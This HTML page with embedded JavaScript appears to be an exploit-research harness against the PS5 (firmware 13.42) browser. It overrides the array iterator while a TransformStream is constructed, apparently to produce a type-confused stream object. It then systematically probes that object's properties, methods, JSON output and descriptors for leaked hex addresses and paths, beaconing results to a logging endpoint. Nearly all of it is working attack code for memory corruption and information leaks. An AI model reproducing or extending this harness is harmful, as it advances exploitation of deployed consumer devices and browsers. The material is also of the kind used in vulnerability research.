<!DOCTYPE html>
<html>
<head>
<meta charset="utf-8">
<title>PS5 — Confused Object Surface Scan</title>
<style>
body { font-family: monospace; background: #0a0a0a; color: #0f0; margin: 20px; font-size: 12px; }
button { background: #1a1a2e; color: #0f0; border: 1px solid #0f0; padding: 8px 12px; margin: 3px; cursor: pointer; font-family: monospace; font-size: 10px; }
button:hover { background: #0f0; color: #000; }
#out { background: #111; border: 1px solid #333; padding: 10px; margin-top: 10px; white-space: pre-wrap; max-height: 500px; overflow-y: auto; font-size: 11px; }
.danger { color: #f44; }
.safe { color: #0f0; }
.warn { color: #fa0; }
.info { color: #88f; }
</style>
</head>
<body>
<h3>🔍 Confused Object Surface Scan — PS5 FW 13.42</h3>
<p>Systematically probe EVERY property/method on corrupted readable/writable.</p>

<div>
  <button onclick="run('P1')">P1: ReadableStream properties</button>
  <button onclick="run('P2')">P2: WritableStream properties</button>
  <button onclick="run('P3')">P3: Cross-prototype access</button>
  <button onclick="run('P4')">P4: Symbol properties</button>
  <button onclick="run('P5')">P5: Internal slots (toString, valueOf)</button>
  <br>
  <button onclick="run('M1')">M1: Method calls (safe order)</button>
  <button onclick="run('M2')">M2: Async methods</button>
  <button onclick="run('M3')">M3: Iterator protocols</button>
  <button onclick="run('M4')">M4: Getter-only properties</button>
  <br>
  <button onclick="run('L1')">L1: Leak via exceptions</button>
  <button onclick="run('L2')">L2: Leak via toString</button>
  <button onclick="run('L3')">L3: Leak via JSON</button>
  <button onclick="run('L4')">L4: Leak via descriptors</button>
  <br>
  <button onclick="clearOut()" style="background:#300;color:#f44;border-color:#f44;">Clear</button>
</div>

<hr>
<pre id="out"></pre>

<script>
var pageId = Math.random().toString(36).slice(2, 8);
var currentVariant = 'menu';
var originalIterator = Array.prototype[Symbol.iterator];

function beacon(m) {
    try { navigator.sendBeacon('/s?p=' + pageId + '&v=' + currentVariant + '&m=' + encodeURIComponent(m)); } catch(e){}
    try { var i = new Image(); i.src = '/s?p=' + pageId + '&v=' + currentVariant + '&m=' + encodeURIComponent(m); } catch(e){}
    var out = document.getElementById('out');
    var line = document.createElement('div');
    var ts = new Date().toLocaleTimeString();
    if (m.indexOf('💀') !== -1 || m.indexOf('CRASH') !== -1) line.className = 'danger';
    else if (m.indexOf('⚠️') !== -1 || m.indexOf('THREW') !== -1) line.className = 'warn';
    else if (m.indexOf('📊') !== -1 || m.indexOf('LEAK') !== -1) line.className = 'info';
    else line.className = 'safe';
    line.textContent = '[' + ts + '] ' + m;
    out.appendChild(line);
    out.scrollTop = out.scrollHeight;
}

function clearOut() {
    document.getElementById('out').innerHTML = '';
    beacon('=== cleared ===');
}

function buildFake(slot1) {
    var fake = { a: 0, b: slot1, c: 0 };
    Array.prototype[Symbol.iterator] = function() {
        var arr = this, i = 0;
        return {
            next: function() {
                if (i >= arr.length) return { done: true };
                var val = arr[i];
                if (arr.length === 3 && i >= 1) val = fake;
                i++;
                return { value: val, done: false };
            }
        };
    };
    var ts;
    try { ts = new TransformStream(); } catch(e) { beacon('construct THREW ' + e.name); }
    Array.prototype[Symbol.iterator] = originalIterator;
    return ts;
}

function probeProp(obj, name, path) {
    try {
        var desc = Object.getOwnPropertyDescriptor(obj, name);
        if (!desc) {
            try { var v = obj[name]; beacon(path + '.' + name + ' = ' + String(v).slice(0,60)); } 
            catch(e) { beacon(path + '.' + name + ' 💀 THREW ' + e.name); }
            return;
        }
        
        if (desc.get) {
            try {
                var v = desc.get.call(obj);
                var s = String(v);
                var tag = Object.prototype.toString.call(v);
                if (s !== tag && s !== '[object Object]') {
                    beacon(path + '.' + name + ' [getter] = ' + tag + ' | ' + s.slice(0,60));
                } else {
                    beacon(path + '.' + name + ' [getter] = ' + tag);
                }
            } catch(e) {
                beacon(path + '.' + name + ' [getter] 💀 THREW ' + e.name + ': ' + String(e.message).slice(0,80));
                // Try to extract leak from error
                var stack = (e.stack || '').slice(0,200);
                var hex = stack.match(/0x[0-9a-fA-F]+/g);
                if (hex) beacon('  📊 HEX=' + hex.join(' '));
            }
        }
        if (desc.set) {
            beacon(path + '.' + name + ' [setter] = function');
        }
        if (!desc.get && !desc.set) {
            beacon(path + '.' + name + ' [value] = ' + String(desc.value).slice(0,60));
        }
    } catch(e) {
        beacon(path + '.' + name + ' 💀 META_THREW ' + e.name);
    }
}

var RUNS = {};

/* P1: ReadableStream properties */
RUNS['P1'] = function() {
    beacon('=== P1: ReadableStream Properties ===');
    var ts = buildFake(new ArrayBuffer(0x100));
    if (!ts) return;
    var r = ts.readable;
    
    var props = ['locked', 'cancel', 'getReader', 'tee', 'pipeTo', 'pipeThrough', 
                 Symbol.asyncIterator, Symbol.iterator, Symbol.toStringTag];
    props.forEach(function(p) {
        var name = typeof p === 'symbol' ? p.toString().slice(7,-1) : p;
        probeProp(r, p, 'readable');
    });
    
    // Try prototype chain
    var proto = Object.getPrototypeOf(r);
    beacon('📊 readable proto=' + Object.prototype.toString.call(proto));
    beacon('📊 readable proto keys=' + Object.getOwnPropertyNames(proto).join(',').slice(0,100));
    beacon('done');
};

/* P2: WritableStream properties */
RUNS['P2'] = function() {
    beacon('=== P2: WritableStream Properties ===');
    var ts = buildFake(new ArrayBuffer(0x100));
    if (!ts) return;
    var w = ts.writable;
    
    var props = ['locked', 'abort', 'getWriter', 'close', Symbol.toStringTag];
    props.forEach(function(p) {
        var name = typeof p === 'symbol' ? p.toString().slice(7,-1) : p;
        probeProp(w, p, 'writable');
    });
    
    var proto = Object.getPrototypeOf(w);
    beacon('📊 writable proto=' + Object.prototype.toString.call(proto));
    beacon('done');
};

/* P3: Cross-prototype access */
RUNS['P3'] = function() {
    beacon('=== P3: Cross-Prototype Access ===');
    var ts = buildFake(new ArrayBuffer(0x100));
    if (!ts) return;
    var r = ts.readable;  // Actually WritableStream internally
    var w = ts.writable;  // Actually ReadableStream internally
    
    // Try accessing WritableStream methods on "readable" (which is WritableStream)
    beacon('--- readable (internal WritableStream) ---');
    ['getWriter', 'abort', 'close'].forEach(function(m) {
        try {
            var fn = r[m];
            beacon('readable.' + m + ' = ' + (typeof fn) + ' | ' + String(fn).slice(0,50));
        } catch(e) {
            beacon('readable.' + m + ' 💀 THREW ' + e.name);
        }
    });
    
    // Try accessing ReadableStream methods on "writable" (which is ReadableStream)
    beacon('--- writable (internal ReadableStream) ---');
    ['getReader', 'cancel', 'tee'].forEach(function(m) {
        try {
            var fn = w[m];
            beacon('writable.' + m + ' = ' + (typeof fn) + ' | ' + String(fn).slice(0,50));
        } catch(e) {
            beacon('writable.' + m + ' 💀 THREW ' + e.name);
        }
    });
    
    beacon('done');
};

/* P4: Symbol properties */
RUNS['P4'] = function() {
    beacon('=== P4: Symbol Properties ===');
    var ts = buildFake(new ArrayBuffer(0x100));
    if (!ts) return;
    
    var syms = Object.getOwnPropertySymbols(ts.readable);
    beacon('📊 readable symbols=' + syms.length);
    syms.forEach(function(s) {
        try {
            var v = ts.readable[s];
            beacon('  readable[' + s.toString() + '] = ' + String(v).slice(0,60));
        } catch(e) {
            beacon('  readable[' + s.toString() + '] 💀 THREW ' + e.name);
        }
    });
    
    syms = Object.getOwnPropertySymbols(ts.writable);
    beacon('📊 writable symbols=' + syms.length);
    syms.forEach(function(s) {
        try {
            var v = ts.writable[s];
            beacon('  writable[' + s.toString() + '] = ' + String(v).slice(0,60));
        } catch(e) {
            beacon('  writable[' + s.toString() + '] 💀 THREW ' + e.name);
        }
    });
    beacon('done');
};

/* P5: Internal slots */
RUNS['P5'] = function() {
    beacon('=== P5: Internal Slots ===');
    var ts = buildFake(new ArrayBuffer(0x100));
    if (!ts) return;
    
    var r = ts.readable;
    var w = ts.writable;
    
    beacon('--- toString variants ---');
    try { beacon('r.toString()=' + r.toString()); } catch(e) { beacon('r.toString 💀 ' + e.name); }
    try { beacon('w.toString()=' + w.toString()); } catch(e) { beacon('w.toString 💀 ' + e.name); }
    try { beacon('r.valueOf()=' + r.valueOf()); } catch(e) { beacon('r.valueOf 💀 ' + e.name); }
    try { beacon('w.valueOf()=' + w.valueOf()); } catch(e) { beacon('w.valueOf 💀 ' + e.name); }
    try { beacon('r[Symbol.toPrimitive]=' + r[Symbol.toPrimitive]); } catch(e) { beacon('r[Symbol.toPrimitive] 💀 ' + e.name); }
    
    beacon('--- Object.prototype methods ---');
    try { beacon('r.constructor.name=' + r.constructor.name); } catch(e) { beacon('r.constructor.name 💀 ' + e.name); }
    try { beacon('w.constructor.name=' + w.constructor.name); } catch(e) { beacon('w.constructor.name 💀 ' + e.name); }
    
    beacon('done');
};

/* M1: Method calls (safe order) */
RUNS['M1'] = function() {
    beacon('=== M1: Method Calls (Safe Order) ===');
    var ts = buildFake(new ArrayBuffer(0x100));
    if (!ts) return;
    var r = ts.readable;
    var w = ts.writable;
    
    // Methods that don't require arguments
    var safeMethods = [
        ['r.toString', function() { return r.toString(); }],
        ['r.valueOf', function() { return r.valueOf(); }],
        ['w.toString', function() { return w.toString(); }],
        ['w.valueOf', function() { return w.valueOf(); }],
        ['Object.keys(r)', function() { return Object.keys(r).join(','); }],
        ['Object.keys(w)', function() { return Object.keys(w).join(','); }],
        ['Object.entries(r)', function() { return Object.entries(r).length; }],
        ['Object.entries(w)', function() { return Object.entries(w).length; }],
    ];
    
    safeMethods.forEach(function(pair) {
        try {
            var v = pair[1]();
            beacon(pair[0] + ' ✅ = ' + String(v).slice(0,60));
        } catch(e) {
            beacon(pair[0] + ' 💀 THREW ' + e.name + ': ' + String(e.message).slice(0,80));
            var hex = (e.stack || '').match(/0x[0-9a-fA-F]+/g);
            if (hex) beacon('  📊 HEX=' + hex.join(' '));
        }
    });
    beacon('done');
};

/* M2: Async methods */
RUNS['M2'] = function() {
    beacon('=== M2: Async Methods ===');
    var ts = buildFake(new ArrayBuffer(0x100));
    if (!ts) return;
    var r = ts.readable;
    var w = ts.writable;
    
    var asyncTests = [
        ['r.cancel()', function() { return r.cancel('test'); }],
        ['w.abort()', function() { return w.abort('test'); }],
        ['w.close()', function() { return w.close(); }],
    ];
    
    var pending = asyncTests.length;
    asyncTests.forEach(function(pair) {
        try {
            var p = pair[1]();
            if (p && typeof p.then === 'function') {
                p.then(function(v) {
                    beacon(pair[0] + ' ✅ RESOLVED = ' + String(v).slice(0,60));
                }).catch(function(e) {
                    beacon(pair[0] + ' ⚠️ REJECTED ' + e.name + ': ' + String(e.message).slice(0,80));
                    var hex = (e.stack || '').match(/0x[0-9a-fA-F]+/g);
                    if (hex) beacon('  📊 HEX=' + hex.join(' '));
                });
            } else {
                beacon(pair[0] + ' ✅ = ' + String(p).slice(0,60));
            }
        } catch(e) {
            beacon(pair[0] + ' 💀 SYNC_THREW ' + e.name);
        }
    });
    
    setTimeout(function() { beacon('done'); }, 1000);
};

/* M3: Iterator protocols */
RUNS['M3'] = function() {
    beacon('=== M3: Iterator Protocols ===');
    var ts = buildFake(new ArrayBuffer(0x100));
    if (!ts) return;
    var r = ts.readable;
    
    try {
        var asyncIter = r[Symbol.asyncIterator];
        beacon('r[Symbol.asyncIterator]=' + typeof asyncIter);
        if (asyncIter) {
            try {
                var iter = asyncIter.call(r);
                beacon('iter=' + Object.prototype.toString.call(iter));
                try {
                    iter.next().then(function(v) {
                        beacon('iter.next() ✅ value=' + String(v.value).slice(0,40) + ' done=' + v.done);
                    }).catch(function(e) {
                        beacon('iter.next() ⚠️ ' + e.name);
                    });
                } catch(e) {
                    beacon('iter.next() sync 💀 ' + e.name);
                }
            } catch(e) {
                beacon('asyncIter.call 💀 ' + e.name);
            }
        }
    } catch(e) {
        beacon('asyncIterator access 💀 ' + e.name);
    }
    
    beacon('done');
};

/* M4: Getter-only deep probe */
RUNS['M4'] = function() {
    beacon('=== M4: Getter-Only Deep Probe ===');
    var ts = buildFake(new ArrayBuffer(0x100));
    if (!ts) return;
    
    function deepProbe(obj, path, depth) {
        if (depth > 2) return;
        try {
            var keys = Object.getOwnPropertyNames(obj);
            keys.forEach(function(k) {
                if (k === 'constructor' || k === 'prototype') return;
                try {
                    var desc = Object.getOwnPropertyDescriptor(obj, k);
                    if (desc && desc.get && !desc.set) {
                        try {
                            var v = desc.get.call(obj);
                            beacon(path + '.' + k + ' [getter-only] = ' + Object.prototype.toString.call(v) + ' | ' + String(v).slice(0,40));
                            if (v && typeof v === 'object') deepProbe(v, path + '.' + k, depth + 1);
                        } catch(e) {
                            beacon(path + '.' + k + ' [getter-only] 💀 THREW ' + e.name);
                            var hex = (e.stack || '').match(/0x[0-9a-fA-F]+/g);
                            if (hex) beacon('  📊 HEX=' + hex.join(' '));
                        }
                    }
                } catch(e) {}
            });
        } catch(e) {}
    }
    
    deepProbe(ts.readable, 'readable', 0);
    deepProbe(ts.writable, 'writable', 0);
    beacon('done');
};

/* L1: Leak via exceptions */
RUNS['L1'] = function() {
    beacon('=== L1: Leak via Exceptions ===');
    var ts = buildFake(new ArrayBuffer(0x100));
    if (!ts) return;
    
    // Try operations that SHOULD fail and see what they reveal
    var leakTests = [
        ['r.getReader()', function() { return ts.readable.getReader(); }],
        ['w.getWriter()', function() { return ts.writable.getWriter(); }],
        ['r.locked (force)', function() { 
            // Force read via defineProperty bypass
            var v = Object.getOwnPropertyDescriptor(Object.getPrototypeOf(ts.readable), 'locked');
            return v.get.call(ts.readable);
        }],
        ['w.locked (force)', function() {
            var v = Object.getOwnPropertyDescriptor(Object.getPrototypeOf(ts.writable), 'locked');
            return v.get.call(ts.writable);
        }],
    ];
    
    leakTests.forEach(function(pair) {
        try {
            pair[1]();
            beacon(pair[0] + ' ✅ unexpected success');
        } catch(e) {
            var msg = String(e.message);
            beacon(pair[0] + ' 💀 ' + e.name + ': ' + msg.slice(0,100));
            // Look for ANY numeric patterns
            var nums = msg.match(/\d+/g);
            if (nums) beacon('  📊 NUMS=' + nums.join(' '));
            var hex = (e.stack || '').match(/0x[0-9a-fA-F]+/g);
            if (hex) beacon('  📊 HEX=' + hex.join(' '));
            // Look for file paths
            var paths = msg.match(/[\w\/\\.-]+\.[\w]+/g);
            if (paths) beacon('  📊 PATHS=' + paths.join(' '));
        }
    });
    beacon('done');
};

/* L2: Leak via toString */
RUNS['L2'] = function() {
    beacon('=== L2: Leak via toString ===');
    var ts = buildFake(new ArrayBuffer(0x100));
    if (!ts) return;
    
    var r = ts.readable;
    var w = ts.writable;
    
    // Function toString on methods
    ['cancel', 'getReader', 'tee', 'pipeTo', 'pipeThrough'].forEach(function(m) {
        try {
            var fn = r[m];
            if (fn) beacon('readable.' + m + '.toString=' + fn.toString().slice(0,80));
        } catch(e) { beacon('readable.' + m + '.toString 💀 ' + e.name); }
    });
    
    ['abort', 'getWriter', 'close'].forEach(function(m) {
        try {
            var fn = w[m];
            if (fn) beacon('writable.' + m + '.toString=' + fn.toString().slice(0,80));
        } catch(e) { beacon('writable.' + m + '.toString 💀 ' + e.name); }
    });
    
    // Object.prototype.toString on internal objects
    try {
        var readerProto = Object.getPrototypeOf(r);
        beacon('readable proto toString=' + Object.prototype.toString.call(readerProto));
        beacon('readable proto keys=' + Object.getOwnPropertyNames(readerProto).join(','));
    } catch(e) { beacon('readable proto 💀 ' + e.name); }
    
    beacon('done');
};

/* L3: Leak via JSON */
RUNS['L3'] = function() {
    beacon('=== L3: Leak via JSON ===');
    var ts = buildFake(new ArrayBuffer(0x100));
    if (!ts) return;
    
    try { beacon('JSON.r=' + JSON.stringify(ts.readable).slice(0,100)); } catch(e) { beacon('JSON.r 💀 ' + e.name); }
    try { beacon('JSON.w=' + JSON.stringify(ts.writable).slice(0,100)); } catch(e) { beacon('JSON.w 💀 ' + e.name); }
    
    // Custom replacer
    try {
        var seen = [];
        var json = JSON.stringify(ts.readable, function(k, v) {
            if (typeof v === 'object' && v !== null) {
                if (seen.indexOf(v) !== -1) return '[Circular]';
                seen.push(v);
            }
            if (typeof v === 'function') return '[Function: ' + (v.name || 'anonymous') + ']';
            return v;
        });
        beacon('JSON.r(replacer)=' + json.slice(0,150));
    } catch(e) { beacon('JSON.r(replacer) 💀 ' + e.name); }
    
    beacon('done');
};

/* L4: Leak via descriptors */
RUNS['L4'] = function() {
    beacon('=== L4: Leak via Descriptors ===');
    var ts = buildFake(new ArrayBuffer(0x100));
    if (!ts) return;
    
    function dumpDescriptors(obj, name) {
        try {
            var props = Object.getOwnPropertyNames(obj);
            beacon(name + ' has ' + props.length + ' own props');
            props.forEach(function(p) {
                try {
                    var d = Object.getOwnPropertyDescriptor(obj, p);
                    var info = '';
                    if (d.get) info += 'G';
                    if (d.set) info += 'S';
                    if ('value' in d) info += 'V=' + String(d.value).slice(0,30);
                    if (d.enumerable) info += 'E';
                    if (d.configurable) info += 'C';
                    beacon('  ' + name + '.' + p + ' [' + info + ']');
                } catch(e) {
                    beacon('  ' + name + '.' + p + ' 💀 descriptor ' + e.name);
                }
            });
        } catch(e) {
            beacon(name + ' 💀 enumerate ' + e.name);
        }
    }
    
    dumpDescriptors(ts.readable, 'readable');
    dumpDescriptors(ts.writable, 'writable');
    dumpDescriptors(Object.getPrototypeOf(ts.readable), 'ReadableStreamProto');
    dumpDescriptors(Object.getPrototypeOf(ts.writable), 'WritableStreamProto');
    
    beacon('done');
};

function run(v) {
    currentVariant = v;
    beacon('\\n>>> BOOT v=' + v + ' <<<');
    try { RUNS[v](); } catch(e) { beacon('💀 RUN THREW ' + e.name + ': ' + e.message); }
}

beacon('\\n🟢 Confused Object Surface Scan Loaded');
beacon('Probe EVERY property on corrupted readable/writable.');
beacon('Look for: unexpected values, hex addresses in errors, or behavior differences.');
</script>
